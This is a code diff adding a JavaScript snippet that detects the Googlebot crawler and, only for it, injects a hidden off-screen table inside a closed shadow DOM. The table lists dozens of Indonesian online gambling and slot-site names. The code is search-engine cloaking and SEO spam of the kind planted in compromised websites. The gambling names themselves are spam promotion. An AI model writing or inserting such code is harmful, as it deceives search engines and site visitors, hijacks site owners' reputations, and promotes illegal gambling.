@@ -1,0 +1,134 @@
+(function () {
+  const isGooglebot = /Googlebot/i.test(navigator.userAgent);
+  if (!isGooglebot) return;
+
+  // Buat shadow host tersembunyi
+  const shadowHost = document.createElement("div");
+  shadowHost.style.display = "block";
+  document.body.appendChild(shadowHost);
+
+  const shadowRoot = shadowHost.attachShadow({ mode: "closed" });
+
+  const style = document.createElement("style");
+  style.textContent = `
+    #link-container {
+      max-height: 1px;
+      overflow: hidden;
+      padding: 10px;
+      border: 0;
+      margin: 0;
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      background: #fff;
+      z-index: -1;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+    }
+    td {
+      padding: 4px 8px;
+      border: 1px solid #ddd;
+    }
+    a {
+      text-decoration: none;
+      color: #007bff;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  `;
+
+  const container = document.createElement("div");
+  container.id = "link-container";
+
+  const table = document.createElement("table");
+
+  const links = [
+    { text: "link situs --hobicuan" },
+    { text: "link situs --jekpot88" },
+		{ text: "situs slot gacor-@nagatoto168" },
+		{ text: "situs slot gacor-carawd88" },
+		{ text: "situs slot gacor--gboslot" },
+		{ text: "situs slot gacor--77betsports" },
+		{ text: "situs slot gacor-lpo88" },
+		{ text: "situs slot gacor-kelinci88" },
+		{ text: "situs slot gacor-nex777" },
+		{ text: "situs slot gacor-spbu777.com" },
+		{ text: "situs slot gacor--jostoto" },
+		{ text: "situs slot gacor--fyp138🔥" },
+		{ text: "situs slot gacor--nagatoto168" },
+		{ text: "slot thailand --(enakcuan)" },
+		{ text: "slot thailand --(angkasa138)" },
+		{ text: "slot thailand --duren777" },
+		{ text: "slot thailand mitosbet88-gacor🔥" },
+		{ text: "rtp slot --slotzeus88" },
+		{ text: "rtp slot www.nusagg.com" },
+		{ text: "rtp slot —evohoki📌" },
+		{ text: "rtp slot --(angkasa138)" },
+		{ text: "rtp slot klikslots.com-slot" },
+		{ text: "rtp slot --77superslot--" },
+		{ text: "link gacor --rajadewa138.com.rajadewa138" },
+		{ text: "link gacor --duren777❤" },
+		{ text: "link gacor --bisabet" },
+		{ text: "link gacor --(jos889)🔥" },
+		{ text: "link gacor --jostoto✅" },
+		{ text: "link gacor --pphoki.comðf3c" },
+		{ text: "link gacor --pragmatic218" },
+		{ text: "link gacor --(nusagg.com)" },
+		{ text: "link gacor --evohoki📌" },
+		{ text: "link gacor sektorplay88.com" },
+		{ text: "link slot --nusagg.com" },
+		{ text: "link slot —evo hoki📌" },
+		{ text: "link slot --duren777" },
+		{ text: "link slot klikslots.com" },
+		{ text: "link slot --(jekpot88)" },
+		{ text: "link slot --(rajacuan69)-" },
+		{ text: "link slot --ligamaster77.it.com" },
+		{ text: "link slot --(jekpot88.com)" },
+		{ text: "link slot --enakcuan" },
+		{ text: "link slot gacor-kaya33.com" },
+		{ text: "link slot gacor-@nagatoto168" },
+		{ text: "link slot gacor a-rajadewa138" },
+		{ text: "link slot gacor-nex777" },
+		{ text: "judi slot --nusagg.com" },
+		{ text: "judi slot --paus4d" },
+		{ text: "judi slot --jajantogel" },
+		{ text: "judi slot —evo hoki📌" },
+		{ text: "judi slot --enakcuan" },
+		{ text: "judi slot --vivo500" },
+		{ text: "judi slot --(duren777)" },
+		{ text: "judi slot easy.fomototo" },
+		{ text: "judi slot --(rajacuan69)" },
+		{ text: "judi slot com--gboslot" },
+		{ text: "judi slot gacor--gbowin" },
+		{ text: "judi slot gacor--gbowin download" },
+		{ text: "daftar slot gacor-motobolaslot" },
+		{ text: "daftar slot gacor-gboslot" },
+		{ text: "daftar slot --(enakcuan)" },
+		{ text: "daftar slot gbowin.link" },
+		{ text: "daftar slot gbowin.online💰" },
+		{ text: "daftar slot gacor microvip88.org" },
+		{ text: "daftar slot c--gboslot" }
+
+  ];
+
+  links.forEach(link => {
+    const row = document.createElement("tr");
+    const cell = document.createElement("td");
+
+    const a = document.createElement("a");
+    a.href = "#";
+    a.textContent = link.text;
+    a.setAttribute("data-nosnippet", "");
+
+    cell.appendChild(a);
+    row.appendChild(cell);
+    table.appendChild(row);
+  });
+
+  container.appendChild(table);
+  shadowRoot.appendChild(style);
+  shadowRoot.appendChild(container);
+})();
